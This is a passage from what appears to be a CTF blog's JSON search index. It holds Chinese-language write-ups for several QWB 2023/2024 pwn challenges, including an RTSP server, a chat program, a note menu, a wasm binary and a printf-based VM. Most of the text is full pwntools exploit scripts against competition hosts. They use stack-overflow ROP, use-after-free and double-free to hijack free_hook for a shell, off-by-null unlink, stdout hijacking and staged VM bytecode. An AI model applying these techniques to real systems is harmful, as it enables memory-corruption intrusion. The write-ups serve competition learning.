sh.close()      #根据网络延迟，作相应的修改      if end - start &gt; 3:         if guess_char == &#x27;\\x00&#x27;:            OK = True         flag += guess_char         print &#x27;success guess char at(&#x27;,index,&#x27;)&#x27;         index+=1         break   print &#x27;flag=&#x27;,flag   if length == len(flag):      OK = Truesh.interactive()","categories":["CTF"],"tags":["shellcode","解释器/简易虚拟机","盲注"]},{"title":"qwb2023_Artsp","url":"/2023/12/18/qwb2023-Artsp/","content":"首先是GET_PARAMETER可以泄漏ELF地址\n\n然后SET_PARAMETER可以设置好后面需要用到的flag标志\n\n最后DESCRIBE先判断前面设置的标记，然后才能进入漏洞位置，造成栈溢出\n\n\n构造时需要注意数组下标v11也会被覆盖，因此在到v11的位置时，将v11覆盖使得dest[v11]指向函数的返回栈的地址，即可写入ROP\n#coding:utf8from pwn import *#ip = &#x27;192.168.190.132&#x27;#port = 8554ip = &#x27;8.147.131.244&#x27;port = 28951sh = remote(ip,port)url = &#x27;rtsp://%s:%d/wavAudioTest&#x27; % (ip,port)context.log_level = &#x27;debug&#x27;payload = &#x27;SETUP %s RTSP/1.0\\r\\n&#x27; % urlpayload += &#x27;CSeq: 1\\r\\n&#x27;payload += &#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\\r\\n&#x27;payload += &#x27;Transport: RTP/TCP;unicast;client_port=49792-49793\\r\\n&#x27;payload += &#x27;\\r\\n&#x27;sh.send(payload)sh.recvuntil(&#x27;Session: &#x27;)session =sh.recvuntil(&#x27;;&#x27;,drop = True)#raw_input()payload = &#x27;GET_PARAMETER %s RTSP/1.0\\r\\n&#x27; % &#x27;*&#x27;payload += &#x27;CSeq: 2\\r\\n&#x27;payload += &#x27;GET_INFO: 2023\\r\\n&#x27;payload += &#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\\r\\n&#x27;payload += &#x27;Session: %s\\r\\n&#x27; % sessionpayload += &#x27;\\r\\n&#x27;sh.send(payload)sh.recvuntil(&#x27;this &#x27;)elf_base = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) - 0x2a9990fopen_addr = elf_base + 0x18090read_addr = elf_base + 0x18200send_addr = elf_base + 0x2949Dpop_rdi = elf_base + 0x000000000007b133pop_rsi = elf_base + 0x0000000000099fb0pop_rdx = elf_base + 0x0000000000019eaapop_rax = elf_base + 0x0000000000035e4aflag_addr = elf_base + 0x7B3E5mode_addr = elf_base + 0x1467buf_addr = elf_base + 0x2A9990print &#x27;elf_base=&#x27;,hex(elf_base)print &#x27;fopen_addr=&#x27;,hex(fopen_addr)print &#x27;read_addr=&#x27;,hex(read_addr)print &#x27;send_addr=&#x27;,hex(send_addr)payload = &#x27;SET_PARAMETER %s RTSP/1.0\\r\\n&#x27; % &#x27;*&#x27;payload += &#x27;CSeq: 3\\r\\n&#x27;payload += &#x27;DESCRIBE_FLAG: qwb\\r\\n&#x27;payload += &#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\\r\\n&#x27;payload += &#x27;Session: %s\\r\\n&#x27; % sessionpayload += &#x27;\\r\\n&#x27;sh.send(payload)sh.recvuntil(&#x27;202 OK&#x27;)rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(mode_addr) + p64(fopen_addr)rop += p64(pop_rdi) + p64(8) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx) + p64(0x30) + p64(read_addr)rop += p64(pop_rax) + p64(5) + p64(pop_rsi) + p64(buf_addr) + p64(pop_rdx) + p64(0x30) + p64(send_addr)#override indexpay = &#x27;a&#x27;*(0x198-0xc) + p16(0x1a8-0x2)pay += roppayload = &#x27;DESCRIBE %s RTSP/1.0\\r\\n&#x27; % urlpayload += &#x27;CSeq: 4\\r\\n&#x27;payload += &#x27;vul_string: %s\\r\\n&#x27; % pay#payload += &#x27;User-Agent: LibVLC/3.0.18 (LIVE555 Streaming Media v2016.11.28)\\r\\n&#x27;#payload += &#x27;Session: %s\\r\\n&#x27; % sessionpayload += &#x27;\\r\\n&#x27;sh.send(payload)sh.interactive()","categories":["CTF"],"tags":["栈溢出","ROP","变量覆盖"]},{"title":"qwb2023_Chatting","url":"/2023/12/18/qwb2023-Chatting/","content":"首先盲目测试一下，发现switch后进行delete，仍然可以show，可以用来进行地址泄漏审计到此处时发现很奇怪，调试得知sub_4838是获取message的个数\n\n添加超出0x64个message时，会发现终端多输出了一个”Delete”字符串，通过gdb调试发现多余0x64的message会被free，但是指针仍然被保存存在UAF，此时再去delete整个username，会释放掉username下的所有message，造成double free使得程序崩溃。存在UAF，可以构造fastbin 的double free，通过message将目标地址连接到fastbin中时，偶然发现fastbin会被整理到tcache中，这样就更加方便申请到目标地址处了，直接打free_hook\n#coding:utf8from pwn import *#sh = process(&#x27;./chatting&#x27;)context.log_level = &#x27;debug&#x27;sh = remote(&#x27;101.200.122.251&#x27;,14509)sh.sendlineafter(&#x27;username:&#x27;,&#x27;ha1vk&#x27;)#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)def add_user(name):   sh.sendlineafter(&#x27;):&#x27;,&#x27;add&#x27;)   sh.sendlineafter(&#x27;username:&#x27;,name)def delete(name):   sh.sendlineafter(&#x27;):&#x27;,&#x27;delete&#x27;)   sh.sendlineafter(&#x27;delete:&#x27;,name)def switch(name):   sh.sendlineafter(&#x27;):&#x27;,&#x27;switch&#x27;)   sh.sendlineafter(&#x27;to:&#x27;,name)def message(name,size,content):   sh.sendlineafter(&#x27;):&#x27;,&#x27;message&#x27;)   sh.sendlineafter(&#x27;To:&#x27;,name)   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;Content:&#x27;,content)def read():   sh.sendlineafter(&#x27;):&#x27;,&#x27;read&#x27;)def listuser():   sh.sendlineafter(&#x27;):&#x27;,&#x27;listuser&#x27;)switch(&#x27;ha1vk&#x27;)message(&#x27;ha1vk&#x27;,0x410,&#x27;a&#x27;*0x410)message(&#x27;cccc&#x27;,0x10,&#x27;bbbbb&#x27;)delete(&#x27;ha1vk&#x27;)read()sh.recvuntil(&#x27;ha1vk: &#x27;)libc_base = u64(sh.recv(6).ljust(8,b&#x27;\\x00&#x27;)) - 0x3ebca0#libc_base = u64(sh.recv(6).ljust(8,b&#x27;\\x00&#x27;)) - 0x219ce0malloc_hook_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]system_addr = libc_base + libc.sym[&#x27;system&#x27;]print(&#x27;libc_base=&#x27;,hex(libc_base))print(&#x27;malloc_hook_addr=&#x27;,hex(malloc_hook_addr))print(&#x27;free_hook_addr=&#x27;,hex(free_hook_addr))#raw_input()add_user(&#x27;ha1vk&#x27;)add_user(&#x27;a&#x27;)add_user(&#x27;b&#x27;)add_user(&#x27;c&#x27;)for i in range(7):   message(&#x27;a&#x27;,0x60,&#x27;a&#x27;*0x60)for i in range(0x64):   message(&#x27;ha1vk&#x27;,0x10,&#x27;h&#x27;*0x10)#UAFmessage(&#x27;ha1vk&#x27;,0x60,&#x27;h&#x27;*0x60)message(&#x27;b&#x27;,0x60,&#x27;b&#x27;*0x60)message(&#x27;b&#x27;,0x60,&#x27;b&#x27;*0x60)#double freedelete(&#x27;a&#x27;)delete(&#x27;b&#x27;)delete(&#x27;ha1vk&#x27;)for i in range(7):   message(&#x27;c&#x27;,0x60,&#x27;alloc tcache&#x27;)message(&#x27;c&#x27;,0x60,p64(free_hook_addr))message(&#x27;c&#x27;,0x60,&#x27;hijack malloc_hook&#x27;)message(&#x27;c&#x27;,0x60,&#x27;/bin/sh\\x00&#x27;.ljust(0x60,&#x27;c&#x27;))message(&#x27;c&#x27;,0x60,p64(system_addr))#getshelldelete(&#x27;c&#x27;)sh.interactive()","categories":["CTF"],"tags":["UAF","fastbin","free_hook"]},{"title":"qwb2023_warmup23","url":"/2023/12/18/qwb2023-warmup23/","content":"菜单题，add功能有一个off by null，glibc为2.35\n\nGlibc 2.25 会检查P-&gt;fd-&gt;bk &#x3D;&#x3D; P &amp;&amp; P-&gt;bk-&gt;fd &#x3D;&#x3D; P &amp;&amp; size &#x3D;&#x3D; prev_size，可以将large bin申请回来后，利用原来残留在fd_nextsize,bk_nextsize的指针来作为fakechunk的fd和bk，那么只需要在fd_nextsize对应堆块的bk位置低字节覆盖指向P，同理bk_nextsize对应堆块的fd位置低字节覆盖指向P，由于add时会添加’\\0’，因此覆盖最少为2字节，这会导致指针的第2字节固定为0，那么就需要构造堆风水使得fakechunk的地址以X0YY结尾，由于ASLR的原因，X可以出现为0的时候，成功率为1&#x2F;16。伪造好chunk以后，利用off by null修改下一个堆块的prev_in_use，然后释放后unlink构造overlap chunk，最后先申请到_IO_2_1_stdout_劫持，泄漏environ拿到栈地址，然后申请到栈上写ROP。\n#coding:utf8from pwn import *libc = ELF(&#x27;./libc.so.6&#x27;)def add(size,content):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;Size:&#x27;,str(size))   sh.sendafter(&#x27;Note:&#x27;,content)def show(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def delete(index):   sh.sendlineafter(&#x27;&gt;&gt;&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Index:&#x27;,str(index))def exp():   add(0x7d50,b&#x27;padding&#x27;) #0   add(0x450,b&#x27;\\x00&#x27;*0x450) #1   add(0x30,b&#x27;b&#x27;*0x30) #2   add(0x30,b&#x27;c&#x27;*0x30) #3   add(0x30,b&#x27;d&#x27;*0x30) #4   add(0x4f0,&#x27;e&#x27;*0x4f0) #5   add(0x440,b&#x27;f&#x27;*0x440) #6   add(0x30,b&#x27;g&#x27;*0x30) #7   add(0x460,b&#x27;h&#x27;*0x460) #8   add(0x30,b&#x27;i&#x27;*0x30) #9   delete(1)   delete(6)   delete(8)   add(0x500,&#x27;get large bin&#x27;) #1   #fake size   add(0x450,p64(0) + p64(0x451+0x40*3)[0:6]) #6   add(0x460,p8(0x20)) #8 fake bk-&gt;fd = P   add(0x440,b&#x27;c&#x27;*0x440) #10   add(0x440,b&#x27;helper&#x27;) #11   add(0x30,&#x27;gap&#x27;) #12   delete(10)   delete(11)   add(0x440,b&#x27;c&#x27;*0x8 + p8(0x20)) #10 fake fd-&gt;bk = P   delete(4)   #null off by one   add(0x38,b&#x27;d&#x27;*0x30 + p64(0x450 + 0x40*3)) #4   #0x40 tcache   delete(9)   delete(3)   #overlap chunk   delete(5)   add(0x440,&#x27;helper&#x27;) #3   add(0x440,&#x27;a&#x27;*0x440) #5   show(2)   sh.recvuntil(&#x27;Note: &#x27;)   libc_base = u64(sh.recv(6).ljust(8,b&#x27;\\x00&#x27;)) - 0x219ce0   _IO_2_1_stdout_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]   environ_addr = libc_base + libc.sym[&#x27;environ&#x27;]   print(&#x27;libc_base=&#x27;,hex(libc_base))   print(&#x27;_IO_2_1_stdout_addr=&#x27;,hex(_IO_2_1_stdout_addr))   print(&#x27;environ_addr=&#x27;,hex(environ_addr))   add(0x50,b&#x27;c&#x27;*0x50) #9   delete(9)   show(2)   sh.recvuntil(&#x27;Note: &#x27;)   xor_key = u64(sh.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))   print(&#x27;xor_key=&#x27;,hex(xor_key))   add(0x200,&#x27;c&#x27;*0x200) #9   add(0x200,&#x27;d&#x27;*0x200) #11   #delete(11)   add(0x50,b&#x27;f&#x27;*0x30 + p64(0) + p64(0x41) + p64(_IO_2_1_stdout_addr ^ xor_key)) #13   #hijack _IO_2_1_stdout_ to leak stack_addr   add(0x30,b&#x27;1&#x27;*0x10 + p64(0) + p64(0x211) + b&#x27;l&#x27;*0x10) #14   add(0x30,p64(0x0FBAD1887) + p64(0)*3 + p64(environ_addr) + p64(environ_addr+0x8)[0:6]) #15   sh.recv(1)   stack_addr = u64(sh.recvuntil(b&#x27;Success~&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))   rop_addr = stack_addr - 0x140 - 8   print(&#x27;rop_addr=&#x27;,hex(rop_addr))   delete(11)   delete(9)   delete(14)   add(0x30,b&#x27;c&#x27;*0x10 + p64(0) + p64(0x211) + p64(rop_addr ^ xor_key)) #9   add(0x200,&#x27;a&#x27;*0x200)   pop_rdi = libc_base + 0x000000000002a3e5   pop_rsi = libc_base + 0x000000000002be51   pop_rdx = libc_base + 0x00000000000796a2   pop_rax = libc_base + 0x0000000000045eb0   syscall = libc_base + 0x42759   read_addr = libc_base + libc.sym[&#x27;read&#x27;]   write_addr = libc_base + libc.sym[&#x27;write&#x27;]   flag_addr = rop_addr + 0xb0   rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)   rop += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x50) + p64(read_addr)   rop += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x50) + p64(write_addr)   rop += b&#x27;./flag\\x00&#x27;   input()   add(0x200,b&#x27;b&#x27;*0x8  +rop)while True:   try:      #sh = process(&#x27;./warmup&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)      context.log_level = &#x27;debug&#x27;      sh = remote(&#x27;120.24.69.11&#x27;,12700)      exp()      #sh.recvuntil(b&#x27;&gt;&gt;&#x27;)      sh.interactive()   except:      sh.close()      passsh.interactive()","categories":["CTF"],"tags":["ROP","off by one","堆风水","IO FILE","glibc 2.35","fd_nextsize,bk_nextsize作为fakechunk的fd和bk"]},{"title":"qwb2023_wtoa","url":"/2023/12/18/qwb2023-wtoa/","content":"wasmtime的预编译程序，用IDA进行分析，找到字符串\n\n在gdb中对字符串进行硬件读断点rwatch *addr，然后在一个函数断下，根据断下的函数一直向上找上层函数，最终发现这个地方很可能是主菜单逻辑\n\nwhile+switch的结构，对switch(v9)的地方进行断点，发现每次菜单输入不一样的选项这里也会有不一样的值，因此这里就是主函数了wasm_0_::function_17_，同时可以推测出wasm_0_::function_51_为printf，调试到此处时有一个可疑的条件判断，是对length进行特殊值判断，通过实验发现进入到这个if里可以多溢出0x20个字节\n\n并且溢出后此时调用show功能程序会崩溃，溢出实际上覆盖的就是wasm的slot_index，我们可以溢出将slot_index指向flag的位置然后show就能泄漏出flag。由于本地和远程地址有一点偏差，先爆破出远程的slot_index\nfrom pwn import *#sh = process(argv=[&#x27;wasmtime&#x27;,&#x27;run&#x27;,&#x27;--env&#x27;,&#x27;FLAG=&quot;flag&#123;test&#125;&quot;&#x27;,&#x27;--disable-cache&#x27;,&#x27;--allow-precompiled&#x27;,&#x27;./wtoa&#x27;])#sh = remote(&#x27;47.100.169.26&#x27;,20231)def add(size,content):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;A&#x27;)   sh.sendlineafter(b&#x27;size &gt;&#x27;,str(size))   sh.sendafter(b&#x27;&gt;&#x27;,content)def edit(index,offset,size,content):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;E&#x27;)   sh.sendlineafter(b&#x27;&gt;&#x27;,str(index))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(offset))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(size))   sh.sendafter(b&#x27;&gt;&#x27;,content)def delete(index):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;D&#x27;)   sh.sendlineafter(b&#x27;&gt;&#x27;,str(index))def show(index,offset,size):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;S&#x27;)   sh.sendlineafter(b&#x27;&gt;&#x27;,str(index))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(offset))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(size))for i in range(0xd00,0,-8):   cur = 0x501000 + i   print(hex(cur))   sh = remote(&#x27;47.100.169.26&#x27;,20231)   #sh = process(argv=[&#x27;wasmtime&#x27;,&#x27;run&#x27;,&#x27;--env&#x27;,&#x27;FLAG=&quot;flag&#123;test&#125;&quot;&#x27;,&#x27;--disable-cache&#x27;,&#x27;--allow-precompiled&#x27;,&#x27;./wtoa&#x27;])   add(0x10,b&#x27;a&#x27;*0x10)   #edit(0,0,3428913,&#x27;a&#x27;*0x40)   #edit(0,0,3428913,p64(0x501b41) + p64(0x10) + p64(0x0000001300000000) + p64(0x501cb8) + p64(0x0000130100000000) + p64(0))   #edit(0,0,3428913,p64(0x501b41) + p64(0x10) + p64(0x0000001300000000) + p64(0x501ca0) + p64(0x0000130100000000) + p64(0))   edit(0,0,3428913,b&#x27;a&#x27;*0x18 + p64(cur) + p64(0x0000130100000000) + p64(0))   show(0,0,0x10)   line = sh.recvline()   sh.close()   print(&#x27;line=&#x27;,line)   if b&#x27;aaaaa&#x27; in line:      print(&#x27;found offset=&#x27;,hex(cur))      break\n爆破出slot_index后，我们就可以进行伪造将其指向flag，然后泄漏得到flag。\n#coding:utf8from pwn import *#sh = process(argv=[&#x27;wasmtime&#x27;,&#x27;run&#x27;,&#x27;--env&#x27;,&#x27;FLAG=&quot;flag&#123;test&#125;&quot;&#x27;,&#x27;--disable-cache&#x27;,&#x27;--allow-precompiled&#x27;,&#x27;./wtoa&#x27;])#sh = remote(&#x27;47.100.169.26&#x27;,20231)def add(size,content):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;A&#x27;)   sh.sendlineafter(b&#x27;size &gt;&#x27;,str(size))   sh.sendafter(b&#x27;&gt;&#x27;,content)def edit(index,offset,size,content):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;E&#x27;)   sh.sendlineafter(b&#x27;&gt;&#x27;,str(index))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(offset))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(size))   sh.sendafter(b&#x27;&gt;&#x27;,content)def delete(index):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;D&#x27;)   sh.sendlineafter(b&#x27;&gt;&#x27;,str(index))def show(index,offset,size):   sh.sendlineafter(b&#x27;Choice &gt;&#x27;,b&#x27;S&#x27;)   sh.sendlineafter(b&#x27;&gt;&#x27;,str(index))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(offset))   sh.sendlineafter(b&#x27;&gt;&#x27;,str(size))sh = remote(&#x27;47.100.169.26&#x27;,20231)#sh = process(argv=[&#x27;wasmtime&#x27;,&#x27;run&#x27;,&#x27;--env&#x27;,&#x27;FLAG=&quot;flag&#123;test&#125;&quot;&#x27;,&#x27;--disable-cache&#x27;,&#x27;--allow-precompiled&#x27;,&#x27;./wtoa&#x27;])add(0x10,b&#x27;a&#x27;*0x10)edit(0,0,3428913,p64(0x501b40+0x20) + p64(0x10) + p64(0x0000001300000000) + p64(0x501cd0) + p64(0x0000130100000000) + p64(0))show(0,0,0x10)sh.interactive()","categories":["CTF"],"tags":["堆溢出","变量覆盖","wasm"]},{"title":"qwb2024_prpr","url":"/2024/11/03/qwb2024-prpr/","content":"通过注册一系列printf处理函数来实现了一个虚拟机\n\n其中虚拟机指令片段在0x3140处\n\n写了一个脚本对指令进行翻译\n#coding:utf8from pwn import *context(arch=&#x27;i386&#x27;)map = &#123;  &#x27;O&#x27;:&#x27;release&#x27;,  &#x27;A&#x27;:&#x27;add&#x27;,  &#x27;C&#x27;:&#x27;and&#x27;,  &#x27;D&#x27;:&#x27;mem[offset] &amp;= pop()&#x27;,  &#x27;E&#x27;:&#x27;or&#x27;,  &#x27;F&#x27;:&#x27;mem[offset] |= pop()&#x27;,  &#x27;G&#x27;:&#x27;xor&#x27;,  &#x27;H&#x27;:&#x27;mem[offset] ^= pop()&#x27;,  &#x27;i&#x27;:&#x27;mul&#x27;,  &#x27;J&#x27;:&#x27;shl&#x27;,  &#x27;K&#x27;:&#x27;shr&#x27;,  &#x27;r&#x27;:&#x27;greater&#x27;,  &#x27;M&#x27;:&#x27;eq&#x27;,  &#x27;N&#x27;:&#x27;jmp&#x27;,  &#x27;S&#x27;:&#x27;jnz&#x27;,  &#x27;T&#x27;:&#x27;jz&#x27;,  &#x27;U&#x27;:&#x27;push&#x27;,  &#x27;V&#x27;:&#x27;load&#x27;,  &#x27;k&#x27;:&#x27;push_r&#x27;,  &#x27;X&#x27;:&#x27;store&#x27;,  &#x27;Y&#x27;:&#x27;pop_r&#x27;,  &#x27;y&#x27;:&#x27;print pop()&#x27;,  &#x27;a&#x27;:&#x27;push getint()&#x27;,  &#x27;b&#x27;:&#x27;print mem[pop()]&#x27;,  &#x27;c&#x27;:&#x27;read mem[pop()]&#x27;,  &#x27;f&#x27;:&#x27;dec sp&#x27;,  &#x27;g&#x27;:&#x27;call&#x27;,  &#x27;n&#x27;:&#x27;return&#x27;,  &#x27;x&#x27;:&#x27;exit_&#x27;&#125;f = open(&#x27;prpr&#x27;,&#x27;rb&#x27;)content = f.read()f.close()code = content[0x3140:0x3140+250*12]no_args = [&#x27;exit_&#x27;,&#x27;return&#x27;,&#x27;dec sp&#x27;,&#x27;push getint()&#x27;,&#x27;add&#x27;,&#x27;print pop()&#x27;,&#x27;print mem[pop()]&#x27;,&#x27;mul&#x27;,&#x27;read mem[pop()]&#x27;,&#x27;and&#x27;,&#x27;xor&#x27;,&#x27;or&#x27;,           &#x27;mem[offset] ^= pop()&#x27;,&#x27;mem[offset] |= pop()&#x27;,&#x27;mem[offset] &amp;= pop()&#x27;,&#x27;greater&#x27;]for i in range(250):   opcode = code[i*12+1]   dont_change_sp = False   if opcode == &#x27;#&#x27;:      opcode = code[i*12+2]      dont_change_sp = True   op_str = opcode   if opcode == &#x27;V&#x27;:      if dont_change_sp:         op_str = str(i) + &#x27; &#x27; + &#x27;*sp = mem[*sp]&#x27;      else:         op_str = str(i) + &#x27; &#x27; + &#x27;push mem[%d]&#x27; % ord(code[i*12+8])   elif opcode == &#x27;X&#x27;:      if dont_change_sp:         op_str = str(i) + &#x27; &#x27; + &#x27;mem[pop()]=pop()&#x27;      else:         op_str = str(i) + &#x27; &#x27; + &#x27;mem[%d]=pop()&#x27; % ord(code[i*12+8])   elif opcode in map:      op_str = str(i) + &#x27; &#x27; + map[opcode]      if map[opcode] not in no_args:         if not op_str.endswith(&quot;_r&quot;):            op_str += &#x27; &#x27;         op_str += str(ord(code[i*12+8]))   else:      op_str = opcode   print op_str\n翻译后得到的内容如下\n0 exit_1 push getint()2 pop_r13 push 2554 push_r15 greater6 jnz 07 push_r18 push 09 greater10 jnz 011 push getint()12 pop_r213 push 6314 push_r215 greater16 jnz 017 push_r218 push 019 greater20 jnz 021 push_r222 push 423 mul24 read mem[pop()]25 push_r126 mem[offset] &amp;= pop()27 push_r228 push 429 mul30 print mem[pop()]31 return32 push getint()33 pop_r334 push getint()35 pop_r436 push 6337 push_r438 greater39 jnz 040 push_r441 push 042 greater43 jnz 044 push 045 pop_r546 push_r447 push_r548 greater49 jnz 5950 call 6051 push_r352 and53 print pop()54 push_r555 push 156 add57 pop_r558 jmp 4659 return60 push getint()61 push_r562 mem[pop()]=pop()63 push_r564 *sp = mem[*sp]65 push 25566 eq 067 jnz 068 push_r569 *sp = mem[*sp]70 return71 push getint()72 pop_r073 push 174 push_r075 eq 076 jz 7977 call 178 jmp 7179 push 280 push_r081 eq 082 jz 8583 call 3284 jmp 7185 push 386 push_r087 eq 088 jz 9189 call 11090 jmp 7191 push 492 push_r093 eq 094 jz 9795 call 14196 jmp 7197 push 598 push_r099 eq 0100 jz 103101 call 178102 jmp 71103 push 6104 push_r0105 eq 0106 jz 109107 call 209108 jmp 71109 exit_110 push getint()111 pop_r1112 push 255113 push_r1114 greater115 jnz 0116 push_r1117 push 0118 greater119 jnz 0120 push getint()121 pop_r2122 push 63123 push_r2124 greater125 jnz 0126 push_r2127 push 0128 greater129 jnz 0130 push_r2131 push 4132 mul133 read mem[pop()]134 push_r1135 mem[offset] ^= pop()136 push_r2137 push 4138 mul139 print mem[pop()]140 return141 push getint()142 pop_r3143 push getint()144 pop_r4145 push 62146 push_r4147 greater148 jnz 0149 push_r4150 push 0151 greater152 jnz 0153 push 0154 pop_r5155 push_r4156 push_r5157 greater158 jnz 177159 call 60160 push_r3161 xor162 push_r5163 mem[pop()]=pop()164 push_r5165 *sp = mem[*sp]166 push 255167 eq 0168 jnz 0169 push_r5170 *sp = mem[*sp]171 print pop()172 push_r5173 push 1174 add175 pop_r5176 jmp 155177 return178 push getint()179 pop_r1180 push 255181 push_r1182 greater183 jnz 0184 push_r1185 push 0186 greater187 jnz 0188 push getint()189 pop_r2190 push 63191 push_r2192 greater193 jnz 0194 push_r2195 push 0196 greater197 jnz 0198 push_r2199 push 4200 mul201 read mem[pop()]202 push_r1203 mem[offset] |= pop()204 push_r2205 push 4206 mul207 print mem[pop()]208 return209 push getint()210 pop_r3211 push getint()212 pop_r4213 push 63214 push_r4215 greater216 jnz 0217 push_r4218 push 0219 greater220 jnz 0221 push 0222 pop_r5223 push_r4224 push_r5225 greater226 jnz 245227 call 60228 push_r3229 or230 push_r5231 mem[pop()]=pop()232 push_r5233 *sp = mem[*sp]234 push 255235 eq 0236 jnz 0237 push_r5238 *sp = mem[*sp]239 print pop()240 push_r5241 push 1242 add243 pop_r5244 jmp 223245 return246 exit_247 exit_248 exit_249 exit_\n\n功能有6个，功能1 输入数据到global-&gt;memory[mem_idx]，并对数据跟输入的一个char数据进行与运算，与运算调用了函数\n\n功能2依次输入数据，并与输入的一个int数据进行与运算。功能3、5与1类似，分别为异或、或运算，功能4、6与2类似，分别为依次的异或、或运算。漏洞在于mem_and、mem_xor、mem_or这三个函数循环的终止条件不正确。如果字符串没有被\\0截断，则循环将继续进行，进而覆盖后面的数据\n\n其中memory结构体如下\n\n数据区大小为0x100，继续向下可以覆盖return_addr，这个return_addr在返回时会用到，即有机会控制pc指针\n\n我们准备利用xor来覆盖，首先从指令中的push 63 push_r2 greater可以知道size限制为64*4 &#x3D; 0x100\n110 push getint()111 pop_r1112 push 255113 push_r1114 greater115 jnz 0116 push_r1117 push 0118 greater119 jnz 0120 push getint()121 pop_r2122 push 63123 push_r2124 greater125 jnz 0126 push_r2127 push 0128 greater129 jnz 0130 push_r2131 push 4132 mul133 read mem[pop()]134 push_r1135 mem[offset] ^= pop()136 push_r2137 push 4138 mul139 print mem[pop()]140 return\n但是这里起始的位置实际上是向前挪了4字节，因此memory的buf里只有0~252字节有数据，最后4字节为0，导致循环不能继续\n\n但是注意到功能4的依次异或可以写252~256字节的数据，这里用的mem就没有向前偏移4字节\n141 push getint()142 pop_r3143 push getint()144 pop_r4145 push 62146 push_r4147 greater148 jnz 0149 push_r4150 push 0151 greater152 jnz 0153 push 0154 pop_r5155 push_r4156 push_r5157 greater158 jnz 177159 call 60160 push_r3161 xor162 push_r5163 mem[pop()]=pop()164 push_r5165 *sp = mem[*sp]166 push 255167 eq 0168 jnz 0169 push_r5170 *sp = mem[*sp]171 print pop()172 push_r5173 push 1174 add175 pop_r5176 jmp 155177 return\n因此可以先调用功能4把memory的buf填满，然后调用功能3触发循环未截断的漏洞去覆盖return_addr。可以将return_addr覆盖为50，因此50这里是call 60函数调用，上下文中，r5此时为0x40。不直接覆盖return_addr为60，因为return会使得mem_idx–，call会使得mem_idx++，我们需要确保mem_idx不超出检查范围\n\n\n50 call 6051 push_r352 and53 print pop()54 push_r555 push 156 add57 pop_r558 jmp 4659 return60 push getint()61 push_r562 mem[pop()]=pop()63 push_r564 *sp = mem[*sp]65 push 25566 eq 067 jnz 068 push_r569 *sp = mem[*sp]70 return\n\n当执行60 push getint()61 push_r562 mem[pop()]&#x3D;pop()时，可以输入一个任意数据，由于r5为0x40，则可以将return_addr覆盖为任意数据，因此实现了pc任意可控。将pc偏移指向可控区，并伪造一系列虚拟机指令结构体，先泄漏堆地址和ELF地址\ncode = b&#x27;a&#x27;*0x8#set mem_idx = 0code += call(int(-0x65cc/12+1)) #mem_idx++#leak code heap addrcode += push(-0x10c4//4) + load_into_stack()code += print_sp_value()code += push(-0x10c4//4+1) + load_into_stack()code += print_sp_value()#leak elf_baseif LOCAL:   print_mem_ptr_off = -0x19D4 #localelse:   print_mem_ptr_off = -0x15C4 #remotecode += push(print_mem_ptr_off//4) + load_into_stack()code += print_sp_value()code += push(print_mem_ptr_off//4+1) + load_into_stack()code += print_sp_value()code += input_sp()#leak free_got addresscode += input_sp()code += load_into_stack()code += print_sp_value()#read stage2 code into mem[0] and execcode += push(0xec) + read_mem()code += jmp(int(-0x65cc/12+3))\n然后继续调用了read_mem()读入第二阶段的虚拟机指令，因为大小不够，分段读入执行。第二阶段把ROP事先读入到一个新的memory中后续使用，然后通过改写regs指针并结合push_r实现任意地址读。\n\n#stage 2code = b&#x27;a&#x27;*0x8code += push(0xfc) + read_mem()code += retn()#stage2 startcode += input_sp()code += load_into_stack()code += print_sp_value()code += call(int(-0x65cc/12)) #read rop into mem[1]code += input_sp()code += push(-0x10b4//4) + store_into_mem()code += input_sp()code += push(-0x10b4//4+1) + store_into_mem()code += push_r(0) #leak stack_addrcode += print_sp_value()&#x27;&#x27;&#x27;code += push_r(1) #leak stack_addrcode += print_sp_value()&#x27;&#x27;&#x27;#read stage3 code into mem[0] and execcode += push(0xd4) + read_mem()code += jmp(int(-0x65cc/12))code = 